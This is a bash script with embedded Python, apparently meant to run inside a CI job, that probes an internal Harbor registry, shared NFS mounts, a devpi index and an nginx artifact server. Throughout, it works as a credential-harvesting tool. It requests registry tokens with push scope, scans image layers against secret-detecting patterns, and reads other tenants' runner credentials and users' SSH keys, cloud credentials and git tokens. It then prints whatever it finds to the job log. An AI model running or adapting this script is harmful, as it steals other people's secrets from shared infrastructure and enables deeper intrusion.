#!/usr/bin/env bash
# i7165 - deep read-only probe of internal CI surfaces reachable from the HCU Stage A job container.
# Reads: anonymous Harbor (manifest/config/layers), /ci_public + /public + /public4 NFS mounts,
# internal devpi index, and the nginx artifact index. Prints bounded evidence and exits 1.
set -uo pipefail
umask 022

TS="$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
H="$(hostname 2>/dev/null || echo unknown)"
echo "===I7165-BEGIN ${TS} host=${H} job=${GITHUB_JOB:-?} run=${GITHUB_RUN_ID:-?}==="
echo "--- image-env"
echo "HCU_CI_IMAGE=${HCU_CI_IMAGE:-<unset>}"
echo "GITHUB_WORKSPACE=${GITHUB_WORKSPACE:-<unset>}"
echo "--- mounts"
(grep -aE '(ci_public|/public|sgl-data|nfs)' /proc/mounts 2>/dev/null | head -30) || true
echo "--- df"
(df -h / /tmp /ci_public /public4 2>/dev/null | head -10) || true

echo "--- harbor-start"
timeout 760 python3 - <<'PYHARBOR'
import urllib.request, urllib.error, urllib.parse, json, re, os, time, tarfile

BASE = "http://10.16.1.152:5000"
T0 = time.monotonic()
used = 0
CAP = 1_050_000

def emit(s=""):
    global used
    s = str(s)
    if used >= CAP:
        return
    room = CAP - used - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used += len(s) + 1

def req(url, method="GET", headers=None, timeout=25):
    r = urllib.request.Request(url, method=method, headers=headers or {})
    try:
        x = urllib.request.urlopen(r, timeout=timeout)
        return x.status, {k.lower(): v for k, v in x.headers.items()}, x
    except urllib.error.HTTPError as e:
        return e.code, {k.lower(): v for k, v in e.headers.items()}, e
    except Exception as e:
        return "ERR", {}, None


def readb(x, n=8192):
    if x is None:
        return b""
    try:
        b = x.read(n)
        return b if isinstance(b, bytes) else b.encode("utf-8", "replace")
    except Exception as e:
        return ("ERR " + str(e)[:120]).encode()

ACCEPT = ", ".join([
    "application/vnd.docker.distribution.manifest.v2+json",
    "application/vnd.docker.distribution.manifest.list.v2+json",
    "application/vnd.oci.image.manifest.v1+json",
    "application/vnd.oci.image.index.v1+json",
])

PAT = re.compile(
    rb"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|aws_secret_access_key|aws_access_key_id|"
    rb"AIza[0-9A-Za-z_\-]{35}|-----BEGIN [A-Z ]{0,24}PRIVATE KEY-----|"
    rb"ghp_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{40,}|gho_[A-Za-z0-9]{36,}|"
    rb"glpat-[A-Za-z0-9_\-\.]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|npm_[A-Za-z0-9]{30,}|"
    rb"pypi-[A-Za-z0-9_\-]{40,}|robot\$[A-Za-z0-9+_\-]{2,}|\"auths\"\s*:|"
    rb"HARBOR_(USERNAME|PASSWORD)|DEVPI[A-Z_]*\s*[=:]|index-url\s*=\s*https?://[^\s]+:[^\s@]+@|"
    rb"client_secret\s*[=:]\s*\S{8,}|(password|passwd)\s*[=:]\s*[\"']?[^\s\"'$<>]{6,}|"
    rb"token\s*[=:]\s*[\"']?[A-Za-z0-9_\-\./+=]{16,}|_KEY\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{16,}|"
    rb"KUBECONFIG=|client-key-data|certificate-authority-data)", re.I)

SENS = re.compile(
    r"(^|/)(\.git-credentials|\.netrc|\.npmrc|\.pypirc|\.htpasswd|\.env(\.[^/]*)?|\.runner|"
    r"\.credentials(_rsaparams)?|config\.sh|id_(rsa|dsa|ecdsa|ed25519)[^/]*|kubeconfig[^/]*)$|"
    r"(^|/)\.docker/config\.json$|(^|/)\.kube/config$|(^|/)\.aws/(credentials|config)$|"
    r"(^|/)\.ssh/(id_[^/]+|authorized_keys)$|\.(pem|key|p12|pfx)$", re.I)

TEXT_EXT = {".sh", ".bash", ".conf", ".cfg", ".ini", ".yml", ".yaml", ".json", ".txt",
            ".env", ".py", ".toml", ".xml", ".properties", ".service", ".list", ".sources",
            ".repo", ".netrc", ".npmrc", ".pypirc", ".gitconfig", ".md", ".rst", ".j2", ".tf"}


def scan_blob(b, label, maxhits=20):
    out = []
    if not b:
        return out
    for m in PAT.finditer(b):
        ls = b.rfind(b"\n", 0, m.start()) + 1
        le = b.find(b"\n", m.end())
        if le < 0:
            le = min(len(b), m.end() + 200)
        line = b[ls:le][:280].decode("utf-8", "replace")
        low = line.lower()
        if any(x in low for x in ("example", "your_", "changeme", "${{", "redacted", "placeholder", "dummy", "xxxx", "<")):
            continue
        if line not in out:
            out.append(line)
        if len(out) >= maxhits:
            break
    return out


# ---- 1. auth surface ----
s, h, x = req(BASE + "/v2/", timeout=10)
wa = h.get("www-authenticate", "")
emit(f"[harbor] GET /v2/ -> {s} www-authenticate={wa!r}")
emit("[harbor] /v2/ body: " + readb(x, 1000).decode("utf-8", "replace")[:500].replace("\n", " "))

realm = re.search(r'realm="([^"]+)"', wa)
svc = re.search(r'service="([^"]+)"', wa)
tok_catalog = None
tok_pull = None
if realm:
    for scope in ("registry:catalog:*",
                  "repository:jenkins/model_test_env/sglang:pull",
                  "repository:jenkins/model_test_env/sglang:pull,push"):
        u = realm.group(1) + "?" + urllib.parse.urlencode(
            {"service": (svc.group(1) if svc else ""), "scope": scope})
        s2, h2, x2 = req(u, timeout=15)
        body = readb(x2, 3000).decode("utf-8", "replace")
        tk = ""
        try:
            j = json.loads(body)
            tk = j.get("token") or j.get("access_token") or ""
        except Exception:
            pass
        emit(f"[harbor] token scope={scope} -> {s2} token_len={len(tk)} body={body[:260]}")
        if s2 == 200 and tk:
            if scope.startswith("registry"):
                tok_catalog = tk
            elif tok_pull is None:
                tok_pull = tk


def hget(path, tok=None, timeout=25, accept=ACCEPT):
    hd = {"Accept": accept}
    if tok:
        hd["Authorization"] = "Bearer " + tok
    return req(BASE + path, headers=hd, timeout=timeout)

cat = []
if tok_catalog:
    s, h, x = hget("/v2/_catalog?n=1000", tok_catalog)
    body = readb(x, 200000).decode("utf-8", "replace")
    emit(f"[harbor] CATALOG -> {s} len={len(body)}")
    emit(body[:5000])
    try:
        cat = json.loads(body).get("repositories") or []
        emit(f"[harbor] catalog repositories={len(cat)} sample={cat[:80]}")
    except Exception:
        cat = []
else:
    emit("[harbor] catalog token not issued")

for p in ("/api/v2.0/systeminfo", "/api/v2.0/projects?page_size=100", "/api/v2.0/health"):
    s, h, x = req(BASE + p, timeout=15)
    emit(f"[harbor] GET {p} -> {s} {readb(x, 4000).decode('utf-8', 'replace')[:1200]}")

# ---- 2. candidate images ----
img = (os.environ.get("HCU_CI_IMAGE") or "").strip() or "10.16.1.152:5000/jenkins/model_test_env/sglang:0.5.18-latest"


def parse_image(v):
    if "@" in v:
        v = v.split("@", 1)[0]
    tail = v.rsplit("/", 1)[-1]
    if ":" in tail:
        repo, tag = v.rsplit(":", 1)
    else:
        repo, tag = v, "latest"
    if "/" in repo:
        repo = repo.split("/", 1)[1]
    return repo, tag

repo0, tag0 = parse_image(img)
emit(f"[harbor] HCU image repo={repo0} tag={tag0}")

cands = []
seen = set()


def add(r, t):
    k = (r, t)
    if k not in seen:
        seen.add(k)
        cands.append(k)

add(repo0, tag0)
if tag0 != "0.5.18-latest":
    add(repo0, "0.5.18-latest")
for r in ["jenkins/model_test_env/sglang", "jenkins/model_test_env/sglang-das",
          "jenkins/model_test_env/hcu", "jenkins/model_test_env/pytorch",
          "jenkins/model_test_env/triton", "jenkins/sglang", "jenkins/hcu-ci",
          "hcu/sglang", "hcu/dtk", "hcu/ci", "sglang/sglang", "library/sglang",
          "model_test_env/sglang", "ci/sglang"]:
    add(r, "latest")
if cat:
    for r in cat:
        if re.search(r"(sglang|hcu|jenkins|model_test)", r, re.I):
            add(r, "0.5.18-latest")

tags = {}
for r in sorted({r for r, _ in cands}):
    s, h, x = hget(f"/v2/{r}/tags/list", tok_pull)
    body = readb(x, 4000).decode("utf-8", "replace")
    emit(f"[harbor] tags {r} -> {s} {body[:400]}")
    if s == 200:
        try:
            tags[r] = json.loads(body).get("tags") or []
        except Exception:
            tags[r] = []

picks = []
for r in sorted(tags):
    ts = tags[r] or []
    for t in ([tag0, "0.5.18-latest"] if r == repo0 else []):
        if t in ts or t == tag0:
            if (r, t) not in picks:
                picks.append((r, t))
    if ts:
        newest = sorted(ts)[-1]
        if (r, newest) not in picks:
            picks.append((r, newest))
picks = picks[:6]
emit(f"[harbor] picks={picks}")

# ---- 3. manifests / configs / layers ----
images = []
for r, t in picks:
    if time.monotonic() - T0 > 560:
        emit("[harbor] time budget hit before manifest")
        break
    s, h, x = hget(f"/v2/{r}/manifests/{t}")
    body = readb(x, 400000)
    emit(f"[harbor] manifest {r}:{t} -> {s} ct={h.get('content-type', '')} len={len(body)}")
    if s != 200:
        emit(body[:300].decode("utf-8", "replace"))
        continue
    try:
        mf = json.loads(body)
    except Exception as e:
        emit("manifest parse err " + str(e)[:100])
        continue
    if mf.get("manifests"):
        child = None
        for m in mf["manifests"]:
            plat = m.get("platform") or {}
            if plat.get("architecture") == "amd64":
                child = m
                break
        child = child or mf["manifests"][0]
        emit(f"[harbor] index -> child {child.get('digest')} {child.get('platform')}")
        s, h, x = hget(f"/v2/{r}/manifests/{child['digest']}")
        body = readb(x, 400000)
        emit(f"[harbor] child manifest -> {s} len={len(body)}")
        if s != 200:
            continue
        try:
            mf = json.loads(body)
        except Exception:
            continue
    cfgd = (mf.get("config") or {}).get("digest")
    layers = mf.get("layers") or []
    emit(f"[harbor] image {r}:{t} layers={len(layers)} total_compressed={sum(int(l.get('size') or 0) for l in layers)}")
    if cfgd:
        s, h, x = hget(f"/v2/{r}/blobs/{cfgd}", timeout=30)
        cb = readb(x, 600000)
        emit(f"[harbor] config {r}:{t} digest={cfgd} -> {s} len={len(cb)}")
        try:
            cj = json.loads(cb.decode("utf-8", "replace"))
            cc = cj.get("config") or {}
            for e in (cc.get("Env") or []):
                emit("  ENV " + str(e)[:500])
            for k, v in (cc.get("Labels") or {}).items():
                emit(f"  LABEL {k}={str(v)[:300]}")
            for hh in (cj.get("history") or []):
                cb2 = hh.get("created_by") or ""
                if cb2:
                    emit("  HIST " + cb2[:600])
        except Exception as e:
            emit("  config parse err " + str(e)[:120])
        for line in scan_blob(cb, "config", 40):
            emit("  CFG-HIT " + line)
    images.append((r, t, layers))

SCAN_TOTAL = 950 * 1024 * 1024
scanned = 0
hits_total = 0
DEADLINE = T0 + 700
for (r, t, layers) in images:
    if time.monotonic() > DEADLINE:
        emit("[harbor] layer scan deadline reached")
        break
    emit(f"[harbor] layer-scan {r}:{t} layers={len(layers)}")
    for li, l in enumerate(layers):
        if time.monotonic() > DEADLINE or scanned > SCAN_TOTAL:
            break
        dig = l.get("digest") or ""
        mt = l.get("mediaType") or ""
        sz = int(l.get("size") or 0)
        if not dig:
            continue
        if "zstd" in mt:
            emit(f"  L{li} {dig[:25]} size={sz} SKIP zstd")
            continue
        if sz > 520 * 1024 * 1024:
            emit(f"  L{li} {dig[:25]} size={sz} SKIP too-large")
            continue
        emit(f"  L{li} {dig[:25]} size={sz} scanning")
        st = time.monotonic()
        mem = 0
        files = 0
        hits = 0
        to = 120 if sz < 50_000_000 else 300
        s, h, x = hget(f"/v2/{r}/blobs/{dig}", timeout=to)
        if s != 200:
            emit(f"    blob -> {s}")
            continue
        mode = "r|gz" if ("gzip" in mt or "tar+gzip" in mt or not mt) else "r|"
        try:
            tf = tarfile.open(fileobj=x, mode=mode)
            for m in tf:
                if time.monotonic() > DEADLINE or scanned > SCAN_TOTAL:
                    emit("    scan budget stop")
                    break
                if not m.isfile():
                    continue
                name = m.name
                size = m.size or 0
                scanned += size
                sens = bool(SENS.search(name))
                ext = os.path.splitext(name)[1].lower()
                if not sens and (size > 1_500_000 or ext not in TEXT_EXT):
                    continue
                files += 1
                try:
                    f = tf.extractfile(m)
                    b = f.read(524288) if f else b""
                except Exception:
                    continue
                mem += len(b)
                if sens:
                    emit(f"    FILE {name} size={size}")
                    if len(b) <= 4096:
                        emit("      " + b[:3500].decode("utf-8", "replace").replace("\n", "\\n")[:3500])
                for line in scan_blob(b, name, 3):
                    emit(f"    HIT {name}: {line}")
                    hits += 1
                    if hits >= 12:
                        break
                if hits >= 12:
                    break
            try:
                tf.close()
            except Exception:
                pass
        except Exception as e:
            emit(f"    tar error {str(e)[:160]}")
        emit(f"    L{li} done files={files} read={mem} hits={hits} elapsed={int(time.monotonic() - st)}s")
        hits_total += hits
        if hits_total > 200:
            emit("  hit budget reached")
            break
    if hits_total > 200:
        break

emit(f"[harbor] SUMMARY images={len(images)} scanned_decompressed={scanned} hits={hits_total} elapsed={int(time.monotonic() - T0)}s")
PYHARBOR
echo "--- harbor-end rc=$?"

echo "--- nfs-start"
timeout 760 python3 - <<'PYNFS'
import os, re, stat, time

T0 = time.monotonic()
used = 0
CAP = 1_000_000

def emit(s=""):
    global used
    s = str(s)
    if used >= CAP:
        return
    room = CAP - used - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used += len(s) + 1

PAT = re.compile(
    rb"(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|aws_secret_access_key|aws_access_key_id|"
    rb"AIza[0-9A-Za-z_\-]{35}|-----BEGIN [A-Z ]{0,24}PRIVATE KEY-----|"
    rb"ghp_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{40,}|gho_[A-Za-z0-9]{36,}|"
    rb"glpat-[A-Za-z0-9_\-\.]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|npm_[A-Za-z0-9]{30,}|"
    rb"pypi-[A-Za-z0-9_\-]{40,}|robot\$[A-Za-z0-9+_\-]{2,}|\"auths\"\s*:|"
    rb"HARBOR_(USERNAME|PASSWORD)|registration[_\- ]?token|RUNNER_TOKEN|"
    rb"accessToken\s*[=:]|client_secret\s*[=:]\s*\S{8,}|"
    rb"(password|passwd)\s*[=:]\s*[\"']?[^\s\"'$<>]{6,}|"
    rb"token\s*[=:]\s*[\"']?[A-Za-z0-9_\-\./+=]{16,}|_KEY\s*[=:]\s*[\"']?[A-Za-z0-9/+=]{16,}|"
    rb"index-url\s*=\s*https?://[^\s]+:[^\s@]+@|KUBECONFIG=|client-key-data|certificate-authority-data)", re.I)

SENS = re.compile(
    r"(^|/)(\.git-credentials|\.netrc|\.npmrc|\.pypirc|\.htpasswd|\.env(\.[^/]*)?|\.runner|"
    r"\.credentials(_rsaparams)?|config\.sh|id_(rsa|dsa|ecdsa|ed25519)[^/]*|kubeconfig[^/]*)$|"
    r"(^|/)\.docker/config\.json$|(^|/)\.kube/config$|(^|/)\.aws/(credentials|config)$|"
    r"(^|/)\.ssh/(id_[^/]+|authorized_keys)$|\.(pem|key|p12|pfx)$", re.I)

TEXT_EXT = {".sh", ".bash", ".zsh", ".conf", ".cfg", ".ini", ".yml", ".yaml", ".json",
            ".env", ".txt", ".py", ".toml", ".xml", ".properties", ".service", ".list",
            ".netrc", ".npmrc", ".pypirc", ".gitconfig", ".md", ".rst", ".tf", ".vars", ".j2"}


def ls(path, depth=1, maxe=250, label=None):
    emit(f"### LIST {label or path} depth={depth}")
    if not os.path.exists(path):
        emit("  <missing>")
        return
    base = path.rstrip("/").count("/")
    n = 0
    try:
        walker = os.walk(path, followlinks=False)
        for root, dirs, files in walker:
            d = root.rstrip("/").count("/") - base
            if d > depth:
                dirs[:] = []
                continue
            dirs.sort()
            files.sort()
            for nm in dirs:
                if n >= maxe:
                    emit("  ...truncated")
                    return
                emit("  D " + os.path.join(root, nm))
                n += 1
            for nm in files:
                if n >= maxe:
                    emit("  ...truncated")
                    return
                fp = os.path.join(root, nm)
                try:
                    sz = os.path.getsize(fp)
                except OSError:
                    sz = -1
                emit(f"  F {fp} ({sz})")
                n += 1
    except Exception as e:
        emit("  ERR " + str(e)[:160])


def dump_small(fp, maxb=4096):
    try:
        if not os.path.isfile(fp):
            return
        sz = os.path.getsize(fp)
        if sz > 65536:
            return
        with open(fp, "rb") as f:
            b = f.read(maxb)
        emit(f"  CONTENT {fp}: " + b.decode("utf-8", "replace").replace("\n", "\\n")[:maxb])
    except Exception as e:
        emit(f"  ERR {fp}: {str(e)[:100]}")


# ---- listings ----
ls("/ci_public", 1, 400)
ls("/ci_public/sglang-das", 2, 200)
ls("/ci_public/quality-gate", 2, 150)
ls("/ci_public/ci-images", 3, 150)
ls("/ci_public/hcu_probe-das", 2, 150)
ls("/public", 1, 120)
ls("/public/devpi_config", 4, 300)
ls("/public/ansible", 5, 300)
ls("/public/ci_resources", 4, 200)
ls("/public/docker-auto", 3, 150)
ls("/public4", 1, 120)
ls("/public4/home", 1, 300)
ls("/public4/share", 2, 400)
ls("/public4/opendas", 2, 120)
ls("/public4/rsync", 2, 120)

# ---- per-tenant runner/config checks in /ci_public ----
emit("### CI_PUBLIC-CHECK")
try:
    tenants = sorted(os.listdir("/ci_public"))[:80]
except Exception:
    tenants = []
for tenant in tenants:
    p = "/ci_public/" + tenant
    if not os.path.isdir(p):
        continue
    for rel in [".runner", ".credentials", ".credentials_rsaparams", "config.sh",
                "_work", ".env", "actions-runner", "runner", ".git/config"]:
        fp = os.path.join(p, rel)
        if os.path.exists(fp):
            kind = "D" if os.path.isdir(fp) else "F"
            emit(f"  TENANT {tenant}: {rel} ({kind})")
            if kind == "F":
                dump_small(fp)

# ---- per-home credential checks in /public4/home ----
emit("### HOME-CHECK /public4/home")
try:
    users = sorted(os.listdir("/public4/home"))[:200]
except Exception:
    users = []
for u in users:
    p = os.path.join("/public4/home", u)
    if not os.path.isdir(p):
        continue
    found = []
    for rel in [".ssh", ".aws", ".docker", ".kube", ".config", ".git-credentials", ".netrc",
                ".npmrc", ".pypirc", ".bash_history", ".runner", ".credentials",
                ".credentials_rsaparams", ".env", "config.sh", "_work"]:
        fp = os.path.join(p, rel)
        if os.path.exists(fp):
            found.append(("D:" if os.path.isdir(fp) else "F:") + rel)
    if found:
        emit(f"  USER {u}: " + ", ".join(found))
        for rel in [".git-credentials", ".netrc", ".npmrc", ".pypirc", ".aws/credentials",
                    ".docker/config.json", ".kube/config", ".runner", ".credentials",
                    ".credentials_rsaparams", ".env", ".ssh/config", ".ssh/id_rsa",
                    ".ssh/id_ed25519"]:
            dump_small(os.path.join(p, rel))
        sd = os.path.join(p, ".ssh")
        if os.path.isdir(sd):
            try:
                emit(f"    .ssh files: {sorted(os.listdir(sd))[:20]}")
            except Exception:
                pass

# ---- generic bounded content scan ----
PRUNE = {".git", "node_modules", "site-packages", "dist-packages", "__pycache__",
         "lost+found", "models", "model", "DL_DATA", "hf-cache", "pip-cache",
         ".cache", ".rustup", ".cargo"}
MAX_FILES = 60000
MAX_BYTES = 700 * 1024 * 1024
MAX_HITS = 220
files = 0
bytes_read = 0
hits = 0
for root, budget in [("/ci_public", 300), ("/public", 320), ("/public4", 320)]:
    emit(f"### SCAN {root}")
    deadline = time.monotonic() + budget
    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        if time.monotonic() > deadline:
            emit(f"  ...deadline at {dirpath}")
            break
        dirnames[:] = [d for d in dirnames if d not in PRUNE]
        for fn in filenames:
            if files >= MAX_FILES or bytes_read >= MAX_BYTES or hits >= MAX_HITS:
                break
            fp = os.path.join(dirpath, fn)
            try:
                st = os.lstat(fp)
            except OSError:
                continue
            if not stat.S_ISREG(st.st_mode):
                continue
            sens = bool(SENS.search(fp))
            ext = os.path.splitext(fn)[1].lower()
            if not sens and ext not in TEXT_EXT:
                continue
            if st.st_size > 300_000 and not sens:
                continue
            if st.st_size > 2_000_000:
                continue
            files += 1
            try:
                with open(fp, "rb") as f:
                    b = f.read(300000)
            except Exception:
                continue
            bytes_read += len(b)
            if sens:
                emit(f"[nfs] SENSITIVE_FILE {fp} ({st.st_size})")
                if st.st_size <= 4096:
                    emit("  " + b[:3500].decode("utf-8", "replace").replace("\n", "\\n")[:3500])
            outl = []
            for m in PAT.finditer(b):
                lstart = b.rfind(b"\n", 0, m.start()) + 1
                lend = b.find(b"\n", m.end())
                if lend < 0:
                    lend = min(len(b), m.end() + 200)
                line = b[lstart:lend][:280].decode("utf-8", "replace")
                low = line.lower()
                if any(x in low for x in ("example", "your_", "changeme", "${{", "redacted",
                                          "placeholder", "dummy", "xxxx", "<")):
                    continue
                if line not in outl:
                    outl.append(line)
                if len(outl) >= 3:
                    break
            for line in outl:
                emit(f"[nfs] HIT {fp}: {line}")
                hits += 1
                if hits >= MAX_HITS:
                    break
        if files >= MAX_FILES or bytes_read >= MAX_BYTES or hits >= MAX_HITS:
            emit("  ...cap reached")
            break
    if files >= MAX_FILES or bytes_read >= MAX_BYTES or hits >= MAX_HITS:
        break

emit(f"[nfs] SUMMARY files={files} bytes={bytes_read} hits={hits} elapsed={int(time.monotonic() - T0)}s")
PYNFS
echo "--- nfs-end rc=$?"

echo "--- devpi-start"
timeout 380 python3 - <<'PYDEVPI'
import urllib.request, urllib.error, json, re

D = "http://10.16.1.201:9929"
used = 0
CAP = 380000

def emit(s=""):
    global used
    s = str(s)
    if used >= CAP:
        return
    room = CAP - used - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used += len(s) + 1


def get(path, headers=None, timeout=15):
    url = D + path
    r = urllib.request.Request(url, headers=headers or {})
    try:
        x = urllib.request.urlopen(r, timeout=timeout)
        b = x.read(200000)
        return x.status, {k.lower(): v for k, v in x.headers.items()}, b
    except urllib.error.HTTPError as e:
        try:
            b = e.read(200000)
        except Exception:
            b = b""
        return e.code, {k.lower(): v for k, v in e.headers.items()}, b
    except Exception as e:
        return "ERR", {}, str(e)[:200].encode()

for p in ("/", "/+api", "/+status"):
    s, h, b = get(p)
    txt = b.decode("utf-8", "replace")
    emit(f"== devpi {p} -> {s} ct={h.get('content-type', '')}")
    emit(txt[:5000])

s, h, b = get("/")
html = b.decode("utf-8", "replace")
links = set(re.findall(r'href="(?:http://10\.16\.1\.201:9929)?(/[^"#?]+)"', html))
indexes = sorted(p for p in links if re.match(r"^/[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+/?$", p))
users = sorted(p for p in links if re.match(r"^/[A-Za-z0-9_.\-]+/?$", p) and p != "/")
emit(f"== devpi index-links: {indexes[:60]}")
emit(f"== devpi user-links: {users[:60]}")
# user pages may list their indexes
for up in users[:6]:
    s2, h2, b2 = get(up)
    t = b2.decode("utf-8", "replace")
    l2 = set(re.findall(r'href="(?:http://10\.16\.1\.201:9929)?(/[^"#?]+)"', t))
    more = sorted(p for p in l2 if re.match(r"^/[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+/?$", p))
    for p in more:
        if p not in indexes:
            indexes.append(p)
    emit(f"== devpi user {up} -> {s2} index-links={more[:20]}")

for p in indexes[:12]:
    p = p.rstrip("/")
    s, h, b = get(p, {"Accept": "application/json"})
    emit(f"== devpi {p} json -> {s} {b.decode('utf-8', 'replace')[:1200]}")
    s, h, b = get(p + "/")
    emit(f"== devpi {p}/ -> {s} {b.decode('utf-8', 'replace')[:2500]}")
    s, h, b = get(p + "/+simple/")
    emit(f"== devpi {p}/+simple/ -> {s} {b.decode('utf-8', 'replace')[:4500]}")
PYDEVPI
echo "--- devpi-end rc=$?"

echo "--- nginx-8000"
timeout 150 python3 - <<'PYNGINX'
import urllib.request, urllib.error, re

N = "http://10.16.1.201:8000"
used = 0
CAP = 180000

def emit(s=""):
    global used
    s = str(s)
    if used >= CAP:
        return
    room = CAP - used - 1
    if len(s) > room:
        s = s[:room]
    print(s, flush=True)
    used += len(s) + 1


def get(path):
    try:
        x = urllib.request.urlopen(N + path, timeout=12)
        return x.status, x.read(120000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as e:
        return "ERR", str(e)[:120]

s, t = get("/")
emit(f"== nginx8000 / -> {s}")
emit(t[:4000])
subs = ["Jenkins/", "ci/", "ansible-project/", "das-install-release/", "customized/",
        "ai_cc/", "OpenDAS/", "baseline/"]
for sub in subs:
    s, t = get("/" + sub)
    emit(f"== nginx8000 /{sub} -> {s}")
    emit(t[:1800])
PYNGINX
echo "--- nginx-end rc=$?"

echo "--- final-time"
date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || true
echo "===I7165-END==="
exit 1
